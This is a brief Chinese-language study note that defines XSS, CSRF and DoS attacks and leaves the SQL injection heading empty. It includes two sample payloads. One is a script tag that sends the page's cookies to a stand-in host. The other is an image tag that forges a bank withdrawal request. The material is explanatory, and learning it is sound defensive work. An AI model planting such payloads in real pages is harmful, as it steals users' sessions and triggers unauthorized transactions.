# xss攻击



跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。



类似以下的代码，攻击者可以向自己的服务器上发送一些当前网站的一些数据，如cookie

```
<script>location.href="//domain.com/?c=" + document.cookie</script>
```



# CSRF

跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。



```
<img src="http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman">
```



## 区别

XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。

# sql注入

# DoS
拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。